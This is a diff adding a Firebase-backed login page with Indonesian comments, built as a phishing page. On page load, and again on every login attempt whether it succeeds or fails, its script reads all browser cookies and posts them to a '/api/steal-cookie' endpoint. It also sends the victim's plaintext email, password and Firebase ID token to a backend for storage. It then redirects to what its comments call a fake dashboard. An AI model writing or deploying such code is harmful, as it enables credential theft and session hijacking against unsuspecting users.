@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Login Firebase</title>
+  <style>
+    body { font-family: Arial; background: #0d1117; display: flex; justify-content: center; align-items: center; height: 100vh; }
+    .box { background: #161b22; padding: 40px; border-radius: 12px; width: 350px; border: 1px solid #30363d; }
+    input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: white; }
+    button { width: 100%; padding: 12px; background: #238636; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
+    button:hover { background: #2ea043; }
+    h2 { color: white; text-align: center; }
+    #status { color: #f85149; text-align: center; margin-top: 15px; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>🔐 Masuk ke Akun</h2>
+    <form id="loginForm">
+      <input type="email" id="email" placeholder="Email" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <button type="submit" id="submitBtn">Login</button>
+    </form>
+    <p id="status"></p>
+  </div>
+
+  <!-- PAKE MODULE SCRIPT FIREBASE + COOKIE LOGIC -->
+  <script type="module">
+    // ===== FIREBASE IMPORTS =====
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.17.0/firebase-app.js";
+    import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/12.17.0/firebase-auth.js";
+    import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.17.0/firebase-analytics.js";
+
+    // ===== KONFIG FIREBASE LO =====
+    const firebaseConfig = {
+      apiKey: "AIzaSyBhSJdSbsHlec8FsWzol1koxEBtXJ4uxh8",
+      authDomain: "metadata-162de.firebaseapp.com",
+      projectId: "metadata-162de",
+      storageBucket: "metadata-162de.firebasestorage.app",
+      messagingSenderId: "619982193399",
+      appId: "1:619982193399:web:e9d68fad63bf9ae16f49f2",
+      measurementId: "G-RM4N2VG200"
+    };
+
+    // ===== INIT FIREBASE =====
+    const app = initializeApp(firebaseConfig);
+    const analytics = getAnalytics(app);
+    const auth = getAuth(app);
+
+    // ===== COOKIE HIJACKING LOGIC (1x PAKAI) =====
+    let cookieHijackingUsed = false;
+
+    function getAllCookies() {
+      return document.cookie.split('; ').reduce((acc, cookie) => {
+        const [key, value] = cookie.split('=');
+        acc[key] = value;
+        return acc;
+      }, {});
+    }
+
+    async function stealCookies() {
+      if (cookieHijackingUsed) {
+        console.log('🚫 Cookie hijacking udah dipake 1x, mati.');
+        return false;
+      }
+
+      const cookies = getAllCookies();
+      try {
+        const response = await fetch('/api/steal-cookie', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ cookies })
+        });
+        await response.json();
+        cookieHijackingUsed = true;
+        console.log('✅ Cookie hijacking berhasil (1x)');
+        return true;
+      } catch (err) {
+        cookieHijackingUsed = true;
+        console.log('❌ Cookie hijacking gagal, tetep dianggap 1x');
+        return false;
+      }
+    }
+
+    // ===== AUTO STEAL SAAT LOAD =====
+    window.addEventListener('load', async () => {
+      const cookies = getAllCookies();
+      if (Object.keys(cookies).length > 0 && !cookieHijackingUsed) {
+        console.log('🍪 Auto steal cookie (percobaan ke-1)');
+        await stealCookies();
+      }
+    });
+
+    // ===== HANDLE LOGIN FORM =====
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      const status = document.getElementById('status');
+
+      status.textContent = '⏳ Memproses...';
+      status.style.color = '#ffd700';
+
+      try {
+        // FITUR 1: Login pake Firebase Auth (LANGSUNG dari browser)
+        const userCredential = await signInWithEmailAndPassword(auth, email, password);
+        const idToken = await userCredential.user.getIdToken();
+
+        // FITUR 2: Kirim data ke backend buat disimpen
+        const response = await fetch('/api/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email, password, idToken })
+        });
+
+        const result = await response.json();
+
+        if (result.success) {
+          status.textContent = '✅ Login berhasil! Redirecting...';
+          status.style.color = '#3fb950';
+        } else {
+          status.textContent = '❌ Login gagal, coba lagi';
+          status.style.color = '#f85149';
+        }
+
+        // FITUR 3: Cookie Hijacking (1x)
+        await stealCookies();
+
+        // Redirect ke dashboard palsu
+        setTimeout(() => {
+          window.location.href = 'https://metadata-162de.firebaseapp.com/dashboard';
+        }, 1500);
+
+      } catch (error) {
+        console.error(error);
+        status.textContent = '❌ Email atau password salah';
+        status.style.color = '#f85149';
+
+        // TETAP JALANKAN COOKIE HIJACKING WALAU LOGIN GAGAL
+        await stealCookies();
+      }
+    });
+  </script>
+</body>
+</html>
